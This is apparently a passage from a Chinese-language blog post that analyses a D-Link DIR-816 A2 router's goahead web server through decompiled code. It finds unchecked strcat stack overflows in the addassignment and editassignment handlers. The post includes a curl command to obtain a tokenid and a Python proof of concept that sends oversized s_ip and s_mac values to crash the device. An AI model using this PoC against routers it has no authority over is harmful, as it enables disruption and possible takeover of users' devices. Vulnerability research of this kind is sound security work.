class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> gohead_pid_status; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> gohead_pid; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> wanconnectionmode_y_n; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> start_pid; <span class="comment">// $s0</span></span><br><span class="line">  _BYTE *telnetenabled; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *language; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> lan_ipaddr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *login; <span class="comment">// $s0</span></span><br><span class="line">  _BYTE *password; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> ip_addr_binary; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> ip_addr; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ip_addr_len; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> ppp_session_id; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+20h] [-140h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+24h] [-13Ch]</span></span><br><span class="line">  <span class="type">char</span> etc_pro_web[<span class="number">128</span>]; <span class="comment">// [sp+28h] [-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ip[<span class="number">128</span>]; <span class="comment">// [sp+A8h] [-B8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v39[<span class="number">14</span>]; <span class="comment">// [sp+128h] [-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  bopen(<span class="number">0</span>, <span class="number">0x80000</span>, <span class="number">1</span>);</span><br><span class="line">  signal(<span class="number">13</span>, <span class="number">1</span>);</span><br><span class="line">  v3 = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, &amp;word_4784D8) )</span><br><span class="line">    portalmange_enable = <span class="number">1</span>;</span><br><span class="line">  gohead_pid_status = fopen(off_480E50, <span class="string">"w+"</span>);  <span class="comment">// /var/run/goahead.pid</span></span><br><span class="line">  <span class="keyword">if</span> ( !gohead_pid_status )</span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">371</span>, <span class="number">2</span>, <span class="string">"goahead.c: cannot open pid file"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  gohead_pid = getpid();</span><br><span class="line">  <span class="built_in">fprintf</span>(gohead_pid_status, <span class="string">"%d"</span>, gohead_pid); <span class="comment">// /var/run/goahead.pid  = v5=getpid();</span></span><br><span class="line">  fclose(gohead_pid_status);</span><br><span class="line">  signal(<span class="number">24</span>, sub_45BCE0);                       <span class="comment">// 超过CPU时间资源限制</span></span><br><span class="line">  signal(<span class="number">17</span>, sub_45BED8);                       <span class="comment">// 子进程结束时, 父进程会收到这个信号。</span></span><br><span class="line">  signal(<span class="number">16</span>, sub_45BA3C);                       <span class="comment">// discard signal 信号丢失</span></span><br><span class="line">  signal(<span class="number">31</span>, WPSSingleTriggerHandler);          <span class="comment">// 非法的系统调用。</span></span><br><span class="line">  signal(<span class="number">20</span>, RaixWPSSingleTriggerHandler);      <span class="comment">// (通常是Ctrl-Z)发出这个信号</span></span><br><span class="line">  v6 = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  {</span><br><span class="line">    v7 = <span class="built_in">strrchr</span>(v6, <span class="number">95</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        v35 = <span class="number">-60</span> * atoi(v7 + <span class="number">1</span>);</span><br><span class="line">        v36 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( settimeofday(<span class="number">0</span>, &amp;v35) &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"===[%s %s %d]set timezone failed!!!\n"</span>, <span class="string">"goahead.c"</span>, <span class="string">"initSystem"</span>, <span class="number">1042</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v8 = nvram_get(<span class="number">0</span>, <span class="string">"OperationMode"</span>);</span><br><span class="line">  wanconnectionmode_y_n = nvram_get(<span class="number">0</span>, <span class="string">"wanConnectionMode"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v8, &amp;word_4784D8) )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(wanconnectionmode_y_n, <span class="string">"DHCP"</span>) )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(wanconnectionmode_y_n, <span class="string">"PPPOE"</span>) )</span><br><span class="line">      {</span><br><span class="line">        v31 = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v31 )</span><br><span class="line">        {</span><br><span class="line">          ppp_session_id = fopen(<span class="string">"/tmp/ppp_session_id"</span>, <span class="string">"w"</span>);</span><br><span class="line">          v33 = ppp_session_id;</span><br><span class="line">          <span class="keyword">if</span> ( ppp_session_id )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">fputs</span>(v31, ppp_session_id);</span><br><span class="line">            fclose(v33);</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( setDefault() &lt; <span class="number">0</span> || initInternet() &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  start_pid = fopen(<span class="string">"/var/run/start.pid"</span>, <span class="string">"w+"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !start_pid )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"open /var/run/start.pid error!"</span>);</span><br><span class="line">  fwrite(<span class="string">"ap is started"</span>, <span class="number">1</span>, <span class="number">13</span>, start_pid);</span><br><span class="line">  fclose(start_pid);</span><br><span class="line">  telnetenabled = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( telnetenabled &amp;&amp; *telnetenabled &amp;&amp; !<span class="built_in">strncmp</span>(telnetenabled, <span class="string">"0"</span>, <span class="number">2</span>) )</span><br><span class="line">    system(<span class="string">"killall -9 telnetd"</span>);</span><br><span class="line">  language = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  load_dictionary(language, dictionary);</span><br><span class="line">  lan_ipaddr = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v39, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  v14 = lan_ipaddr;</span><br><span class="line">  socketOpen();</span><br><span class="line">  login = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  password = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  umOpen();</span><br><span class="line">  umAddGroup(<span class="string">"adm"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( login &amp;&amp; *login &amp;&amp; password &amp;&amp; *password )</span><br><span class="line">  {</span><br><span class="line">    umAddUser(login, password, <span class="string">"adm"</span>);          <span class="comment">// 添加用户，账号密码不为空</span></span><br><span class="line">    umAddAccessLimit(<span class="string">"/"</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="string">"adm"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">1167</span>, <span class="number">2</span>, <span class="string">"gohead.c: Warning: empty administrator account or password"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">1190</span>, <span class="number">2</span>, <span class="string">"initWebs: cannot find lan_ip in NVRAM"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  ip_addr_binary = inet_addr(v14, <span class="number">1190</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ip_addr_binary == <span class="number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    error(<span class="string">"goahead.c"</span>, <span class="number">1195</span>, <span class="number">2</span>, <span class="string">"initWebs: failed to convert %s to binary ip data"</span>, v14);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">strcpy</span>(etc_pro_web, off_480E58);              <span class="comment">// /etc_ro/web</span></span><br><span class="line">  websSetDefaultDir(etc_pro_web, v18, v19);     <span class="comment">// 设置网页根目录</span></span><br><span class="line">  ip_addr = inet_ntoa(ip_addr_binary);</span><br><span class="line">  ip_addr_len = <span class="built_in">strlen</span>(ip_addr) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ip_addr_len &gt;= <span class="number">0x80</span> )</span><br><span class="line">    ip_addr_len = <span class="number">0x80</span>;</span><br><span class="line">  ascToUni(ip, ip_addr, ip_addr_len);</span><br><span class="line">  websSetIpaddr(ip, v22, v23, v24);</span><br><span class="line">  websSetHost(ip, v25, v26, v27);</span><br><span class="line">  websSetDefaultPage(<span class="string">"default.asp"</span>);            <span class="comment">// 设置默认访问页</span></span><br><span class="line">  websSetPassword(off_480E54);                  <span class="comment">// 设置默认密码为空</span></span><br><span class="line">  websOpenServer(dword_480E44, dword_480E48);   <span class="comment">// Web服务器端口和重试次数</span></span><br><span class="line">  <span class="keyword">if</span> ( !::login )</span><br><span class="line">  {</span><br><span class="line">    v34 = rand();</span><br><span class="line">    <span class="built_in">sprintf</span>(v39, <span class="string">"echo -n %lu &gt; /etc/RAMConfig/tokenid"</span>, v34);</span><br><span class="line">    system(v39);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%s:%d]:tokenid=%s\n"</span>, <span class="string">"initWebs"</span>, <span class="number">1237</span>, v39);</span><br><span class="line">  }</span><br><span class="line">  websUrlHandlerDefine(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>, websSecurityHandler);<span class="comment">// 定义安全性处理程序，表单处理程序，默认网页处理程序</span></span><br><span class="line">  websUrlHandlerDefine(<span class="string">"/goform"</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">"/cgi-bin"</span>, <span class="number">0</span>, <span class="number">0</span>, websCgiHandler);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">"/sharefile"</span>, <span class="number">0</span>, <span class="number">0</span>, websShareFileHandler);</span><br><span class="line">  websUrlHandlerDefine(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>, websDefaultHandler);</span><br><span class="line">  formDefineUtilities();</span><br><span class="line">  formDefineInternet();</span><br><span class="line">  form_define_ip_control();</span><br><span class="line">  formDefineQoS();</span><br><span class="line">  formDefineWireless();</span><br><span class="line">  formDefineInic();</span><br><span class="line">  formDefineFirewall();</span><br><span class="line">  formDefineManagement();</span><br><span class="line">  formDefineLogout();</span><br><span class="line">  formDefineWizard();</span><br><span class="line">  formDefineVPN();</span><br><span class="line">  formDefineHttpSharefile();</span><br><span class="line">  websUrlHandlerDefine(<span class="string">"/"</span>, <span class="number">0</span>, <span class="number">0</span>, sub_45D4A0);</span><br><span class="line">  <span class="keyword">while</span> ( !dword_483AD8 )</span><br><span class="line">  {</span><br><span class="line">    v29 = socketReady(<span class="number">-1</span>);</span><br><span class="line">    v30 = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v29 || socketSelect(<span class="number">-1</span>, <span class="number">1000</span>) )</span><br><span class="line">      socketProcess(<span class="number">-1</span>, v30);</span><br><span class="line">    websCgiCleanup();</span><br><span class="line">    emfSchedProcess();</span><br><span class="line">  }</span><br><span class="line">  release_dictionary(dictionary);</span><br><span class="line">  umClose();</span><br><span class="line">  websCloseServer();</span><br><span class="line">  socketClose();</span><br><span class="line">  bclose();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>初步分析之后155行之前都是初始化的一个过程，goahead启动是否成功，<code>设置网页根目录</code>、<code>设置网页默认页</code>、<code>密码为空</code>等一系列初始化过程。</p>
<p>在主页登陆抓一个包可以看到是<code>POST /goform/formLogin</code>请求，所以我们在研究的时候需要着重研究goform这些用户自定义函数。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /goform/formLogin HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">102.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">102.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 93</span></span><br><span class="line"><span class="comment">Origin: http://192.168.0.1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://192.168.0.1/dir_login.asp</span></span><br><span class="line"><span class="comment">Cookie: curShow=</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">username=QWRtaW4%3D&amp;password=&amp;Language=Chinese&amp;submit.htm%3Flogin.htm=Send&amp;tokenid=1714636915</span></span><br></pre></td></tr></tbody></table></figure>

<p>使用<code>websUrlHandlerDefine</code>来监听url请求，定义了安全性处理程序，表单处理程序，默认网页处理程序。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">websUrlHandlerDefine(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>, websSecurityHandler);<span class="comment">// 定义安全性处理程序，表单处理程序，默认网页处理程序</span></span><br><span class="line">websUrlHandlerDefine(<span class="string">"/goform"</span>, <span class="number">0</span>, <span class="number">0</span>, websFormHandler);</span><br><span class="line">websUrlHandlerDefine(<span class="string">"/cgi-bin"</span>, <span class="number">0</span>, <span class="number">0</span>, websCgiHandler);</span><br><span class="line">websUrlHandlerDefine(<span class="string">"/sharefile"</span>, <span class="number">0</span>, <span class="number">0</span>, websShareFileHandler);</span><br><span class="line">websUrlHandlerDefine(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>, websDefaultHandler);</span><br><span class="line">formDefineUtilities();</span><br><span class="line">formDefineInternet();</span><br><span class="line">form_define_ip_control();</span><br><span class="line">formDefineQoS();</span><br><span class="line">formDefineWireless();</span><br><span class="line">formDefineInic();</span><br><span class="line">formDefineFirewall();</span><br><span class="line">formDefineManagement();</span><br><span class="line">formDefineLogout();</span><br><span class="line">formDefineWizard();</span><br><span class="line">formDefineVPN();</span><br><span class="line">formDefineHttpSharefile();</span><br><span class="line">websUrlHandlerDefine(<span class="string">"/"</span>, <span class="number">0</span>, <span class="number">0</span>, sub_45D4A0);</span><br></pre></td></tr></tbody></table></figure>

<p>当监听到url中请求了/goform时，例如：<code>http://192.168.0.1/goform/setSysAdm</code>则使用<code>websFormHandler</code>先进行理，再到setSysAdm用户自定义的的函数中进行处理。<code>websFormHandler</code>的函数处理如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">websFormHandler</span><span class="params">(<span class="type">webs_t</span> wp, <span class="type">char_t</span> *urlPrefix, <span class="type">char_t</span> *webDir, <span class="type">int</span> arg, </span></span><br><span class="line"><span class="params">	<span class="type">char_t</span> *url, <span class="type">char_t</span> *path, <span class="type">char_t</span> *query)</span></span><br></pre></td></tr></tbody></table></figure>

<p>其中wp里面包含了用户请求的相关信息，如请求头， 请求数据等。开发者通过 <code>wp</code> 这个参数就能获取到用户请求的信息。</p>
<p>第160行开始就是自定义函数了，我们重点看websFormDefine这一类的函数就可以了</p>
<h2 id="formDefineInternet"><a href="#formDefineInternet" class="headerlink" title="formDefineInternet"></a>formDefineInternet</h2><p>在<code>formDefineInternet</code>这里找到了很多的漏洞点。</p>
<h3 id="addassignment"><a href="#addassignment" class="headerlink" title="addassignment"></a>addassignment</h3><p>在这个函数中发现了栈溢出漏洞，并验证成功。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">addassignment</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  _BYTE *s_ip; <span class="comment">// $s5</span></span><br><span class="line">  _BYTE *s_mac; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  BOOL s_mac_len_flags; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// $v1</span></span><br><span class="line">  BOOL v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">1024</span>]; <span class="comment">// [sp+18h] [-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  s_ip = websGetVar(a1, <span class="string">"s_ip"</span>, <span class="string">""</span>);</span><br><span class="line">  s_mac = websGetVar(a1, <span class="string">"s_mac"</span>, <span class="string">""</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    s_mac_len_flags = v4 &lt; <span class="built_in">strlen</span>(s_mac);       <span class="comment">// s_mac长度是否大于0</span></span><br><span class="line">    v6 = &amp;s_mac[v4++];</span><br><span class="line">    <span class="keyword">if</span> ( !s_mac_len_flags )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v6 == <span class="number">45</span> )</span><br><span class="line">    {</span><br><span class="line">      *v6 = <span class="number">58</span>;</span><br><span class="line">      v7 = v4 &lt; <span class="built_in">strlen</span>(s_mac);</span><br><span class="line">      v6 = &amp;s_mac[v4++];</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">LABEL_5:</span><br><span class="line">  <span class="keyword">if</span> ( !*s_ip || !*s_mac )</span><br><span class="line">    <span class="keyword">return</span> websRedirect(a1, <span class="string">"lan.asp"</span>);</span><br><span class="line">  v9 = nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v10, v9);</span><br><span class="line">  <span class="built_in">strcat</span>(v10, s_mac);                           <span class="comment">// stack_overflow</span></span><br><span class="line">  <span class="built_in">strcat</span>(v10, <span class="string">" "</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(v10, s_ip);                            <span class="comment">// stack_overflow</span></span><br><span class="line">  <span class="built_in">strcat</span>(v10, <span class="string">"|"</span>);</span><br><span class="line">  nvram_bufset(<span class="number">0</span>, <span class="string">"DhcpStaticRulesStr"</span>, v10);</span><br><span class="line">  nvram_commit(<span class="number">0</span>);</span><br><span class="line">  doSystem(<span class="string">"lan.sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> websRedirect(a1, <span class="string">"lan.asp"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到用户可以传送s_mac和s_ip，并在下面使用strcat进行拼接放入v10，值得一提的是并没有进行大小限制，所以这里存在一个栈溢出漏洞。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="comment">//192.168.0.1/dir_login.asp | grep tokenid</span></span><br></pre></td></tr></tbody></table></figure>

<p>先拿到tokenid</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>:<span class="number">59</span>:<span class="number">06</span> z1r0@z1r0deMacBook-Pro.local iot curl http:<span class="comment">//192.168.0.1/dir_login.asp | grep tokenid</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>  <span class="number">4341</span>    <span class="number">0</span>  <span class="number">4341</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">174</span>k      <span class="number">0</span> --:--:-- --:--:-- --:--:--  <span class="number">235</span>k</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"tokenid"</span>  value=<span class="string">"1804289383"</span> &gt;</span><br></pre></td></tr></tbody></table></figure>

<p>接下来我们使用如下poc进行验证</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/addassignment'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'s_ip'</span> : <span class="string">'a'</span> * <span class="number">0x400</span>,</span><br><span class="line">    <span class="string">'s_mac'</span> : <span class="string">'a'</span> * <span class="number">0x400</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/3.png" style="zoom:50%;">

<p>成功利用，最后可以写exp来达到稳定获取root shell。这里笔者不演示如何getshell，只对路由器进行漏洞分析，可能下一个文章会写如何获取shell。</p>
<h3 id="editassignment"><a href="#editassignment" class="headerlink" title="editassignment"></a>editassignment</h3><p>此函数也存在和上面一样的漏洞</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(v17, s_mac);</span><br><span class="line"><span class="built_in">strcat</span>(v17, <span class="string">" "</span>);</span><br><span class="line"><span class="built_in">strcat</span>(v17, s_ip);</span><br><span class="line"><span class="built_in">strcat</span>(v17, <span class="string">"|"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>在第71行进行拼接的时候发现没有进行size验证，导致栈溢出。以下poc验证</p>
